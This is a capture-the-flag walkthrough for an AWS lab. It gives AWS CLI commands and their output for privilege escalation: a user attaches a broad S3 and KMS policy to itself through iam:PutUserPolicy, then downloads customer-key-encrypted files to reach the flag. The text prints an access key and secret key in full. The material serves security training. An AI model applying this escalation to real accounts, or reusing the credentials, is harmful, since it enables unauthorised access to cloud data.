# COMPLETE AWS LAB COMMANDS WITH HIGHLIGHTED OUTPUT!

## COMMAND 1: CONFIGURE AWS CLI
```cmd
aws configure
```
**Enter these values:**
- Access Key ID: `AKIAQ3EGUZME3BAXFV7D`
- Secret Access Key: `2ETmQExURN6kBI0/2kClgcuTLyVBD5idkrJSFvsY`
- Default region: `us-east-1`
- Default output: `json`

---

## COMMAND 2: VERIFY YOUR IDENTITY
```cmd
aws sts get-caller-identity
```

**🔍 CHECK THIS IN YOUR OUTPUT:**
```json
{
    "UserId": "AIDAQ3EGUZME24ILVB44T",
    "Account": "058264439561",
    ➡️ "Arn": "arn:aws:iam::058264439561:user/BackupReader1"  <─── YOUR USERNAME!
}
```

---

## COMMAND 3: CHECK YOUR PERMISSIONS BOUNDARY
```cmd
aws iam get-user --query "User.PermissionsBoundary" --output text
```

**🔍 CHECK THIS:**
```
➡️ arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy       Policy  <─── YOUR RESTRICTIONS!
```

---

## COMMAND 4: GET POLICY DETAILS
```cmd
aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy
```

**🔍 CHECK THESE HIGHLIGHTED WORDS:**
```json
{
    "Policy": {
        ➡️ "PolicyName": "PermissionBoundaryPolicy",  <─── POLICY NAME
        "PolicyId": "ANPAQ3EGUZMEQVY32A5L4",
        ➡️ "Arn": "arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy",  <─── POLICY ARN
        ➡️ "DefaultVersionId": "v3",  <─── VERSION TO CHECK!
    }
}
```

---

## COMMAND 5: SEE WHAT YOU CAN ACTUALLY DO
```cmd
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy --version-id v3
```

**🔍 THESE ARE YOUR ALLOWED ACTIONS - VERY IMPORTANT!**
```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        ➡️ "s3:ListBucket",      <─── YOU CAN LIST S3 BUCKETS
                        ➡️ "s3:GetObject"        <─── YOU CAN GET OBJECTS
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        ➡️ "arn:aws:s3:::securecopbakupbuk1",        <─── THIS BUCKET!
                        "arn:aws:s3:::securecopbakupbuk1/*"
                    ]
                },
                {
                    "Action": [
                        ➡️ "kms:Decrypt"          <─── YOU CAN DECRYPT WITH KMS!
                    ],
                    "Effect": "Allow",
                    "Resource": ➡️ "arn:aws:kms:us-east-1:058264439561:key/a7a251b3-c889-4dd1-9176-931c207c33d5"  <─── THIS KMS KEY!
                },
                {
                    "Action": [
                        "iam:GetUser",
                        "iam:ListUserPolicies",
                        "iam:ListAttachedUserPolicies",
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Effect": "Allow"
                },
                {
                    "Action": [
                        ➡️ "iam:PutUserPolicy"    <─── YOU CAN ATTACH POLICIES TO YOURSELF!
                    ],
                    "Effect": "Allow",
                    "Resource": ➡️ "arn:aws:iam::058264439561:user/BackupReader1"  <─── TO YOUR USER!
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v3",
        "IsDefaultVersion": true,
    }
}
```

**✅ KEY DISCOVERY:** You can attach policies to yourself (`iam:PutUserPolicy`)!

---

## COMMAND 6: CREATE THE POLICY FILE (DO THIS FIRST!)
You need to create a file called `policy.json` with this content:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:*"
      ],
      "Resource": [
        "arn:aws:s3:::securecopbakupbuk1",
        "arn:aws:s3:::securecopbakupbuk1/*"
      ]
    },
    {
      "Effect": "Allow",
      "Action": "kms:*",
      "Resource": "arn:aws:kms:us-east-1:058264439561:key/a7a251b3-c889-4dd1-9176-931c207c33d5"
    }
  ]
}
```

**📝 HOW TO CREATE THIS FILE:**
```cmd
notepad policy.json
```
Then copy-paste the JSON above and save it!

---

## COMMAND 7: ATTACH THE POLICY TO YOURSELF
```cmd
aws iam put-user-policy --user-name BackupReader1 --policy-name KMSFullAccessPolicy --policy-document file://policy.json
```

**⚠️ NOTE:** You got an error because `policy.json` didn't exist yet. After creating it, run this command!

---

## COMMAND 8: CHECK EXISTING POLICIES
```cmd
aws iam list-attached-user-policies --user-name BackupReader1
```

**🔍 CHECK THIS:**
```json
{
    "AttachedPolicies": [
        {
            ➡️ "PolicyName": "UserPolicy",  <─── ALREADY ATTACHED
            "PolicyArn": "arn:aws:iam::058264439561:policy/UserPolicy"
        }
    ]
}
```

---

## COMMAND 9: VIEW THE EXISTING POLICY
```cmd
aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/UserPolicy
```

```json
{
    "Policy": {
        ➡️ "PolicyName": "UserPolicy",
        ➡️ "DefaultVersionId": "v1"
    }
}
```

---

## COMMAND 10: SEE WHAT THE EXISTING POLICY ALLOWS
```cmd
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/UserPolicy --version-id v1
```

```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        ➡️ "iam:PutUserPolicy",  <─── SAME ABILITY TO ATTACH POLICIES!
                        "iam:GetUser",
                        "iam:ListUserPolicies",
                        "iam:ListAttachedUserPolicies",
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        }
    }
}
```

---

## COMMAND 11: LIST S3 BUCKET CONTENTS
```cmd
aws s3 ls s3://securecopbakupbuk1/
```

**🔍 CHECK THESE FILES:**
```
                           PRE .BurpSuite/
2024-09-24 16:49:10        411 ➡️ Hospital+Patient+Records.zip  <─── INTERESTING!
2024-09-24 16:48:40        411 ➡️ env.txt                       <─── INTERESTING!
2024-09-24 16:43:42        113 ➡️ key.txt                       <─── DOWNLOAD THIS FIRST!
```

---

## COMMAND 12: DOWNLOAD KEY.TXT
```cmd
aws s3 cp s3://securecopbakupbuk1/key.txt .
```

**🔍 CHECK:**
```
download: s3://securecopbakupbuk1/key.txt to .\key.txt  <─── DOWNLOADED!
```

---

## COMMAND 13: VIEW KEY.TXT CONTENTS
```cmd
type key.txt
```

**🔍 YOU SHOULD SEE SOMETHING LIKE:**
```
CustomerKey: ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM=
CustomerKeyMD5: ESUzbd203tahLpxvA6LL4g==
```

**✅ THIS IS THE ENCRYPTION KEY NEEDED FOR OTHER FILES!**

---

## COMMAND 14: DOWNLOAD ENV.TXT (ENCRYPTED)
```cmd
aws s3api get-object --bucket securecopbakupbuk1 --key env.txt ./env9.txt --sse-customer-algorithm AES256 --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g==
```

**🔍 CHECK:**
```json
{
    "AcceptRanges": "bytes",
    "LastModified": "2024-09-24T11:18:40+00:00",
    "ContentLength": 411,
    "ETag": "\"749eb3a7b32276781c2da504dc6bdff8\"",
    "ContentType": "binary/octet-stream",
    ➡️ "SSECustomerAlgorithm": "AES256",  <─── DECRYPTED WITH YOUR KEY!
    "SSECustomerKeyMD5": "ESUzbd203tahLpxvA6LL4g=="
}
```

---

## COMMAND 15: DOWNLOAD HOSPITAL+Patient+Records.zip
```cmd
aws s3api get-object --bucket securecopbakupbuk1 --key Hospital+Patient+Records.zip ./Hospital9.zip --sse-customer-algorithm AES256 --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g==
```

**🔍 CHECK:**
```json
{
    "AcceptRanges": "bytes",
    "LastModified": "2024-09-24T11:19:10+00:00",
    "ContentLength": 411,
    "ETag": "\"5fbd62059ce9f469c4025fad4eb06d05\"",
    "ContentType": "binary/octet-stream",
    ➡️ "SSECustomerAlgorithm": "AES256",  <─── DECRYPTED!
    "SSECustomerKeyMD5": "ESUzbd203tahLpxvA6LL4g=="
}
```

---

## COMMAND 16: VIEW THE FLAG (FINAL STEP!)
```cmd
type env9.txt
```
**OR** if you want to open in Notepad:
```cmd
notepad env9.txt
```

**🔍 YOU SHOULD SEE THE FLAG:**
```
➡️ CWL{AWS_KMS_Key_chal!enge_Suc(es$}  <─── 🏁 THE FLAG! 🏁
```

---
#  KeyMaster - Decoding S3 Secrets
# 📋 QUICK REFERENCE - WHAT TO LOOK FOR:

| Command | Look For These Words | Why It's Important |
|--------|---------------------|-------------------|
| `aws sts get-caller-identity` | **"BackupReader1"** | Your username |
| `aws iam get-policy-version` | **"s3:ListBucket", "s3:GetObject", "kms:Decrypt", "iam:PutUserPolicy"** | Your permissions! |
| `aws s3 ls` | **"key.txt", "env.txt", "Hospital+Patient+Records.zip"** | Files in the bucket |
| `type key.txt` | **"CustomerKey:"** | The encryption key! |
| `aws s3api get-object` with key | **"SSECustomerAlgorithm": "AES256"** | Successfully decrypted |
| `type env9.txt` | **"CWL{AWS_KMS_Key_chal!enge_Suc(es$}"** | THE FLAG! |

---

# 🎯 WHY THIS LAB WORKS:

1. **Initial Permission:** You can only list and get objects from S3, and decrypt with one specific KMS key
2. **Critical Flaw:** You can also attach policies to yourself (`iam:PutUserPolicy`)!
3. **Privilege Escalation:** You attach a policy giving yourself full S3 and KMS access
4. **Download Key File:** Get `key.txt` which contains the customer encryption key
5. **Decrypt Files:** Use the key to decrypt `env.txt` and find the flag!

**THE LESSON:** Never allow users to attach policies to themselves, and be careful with customer-provided encryption keys!
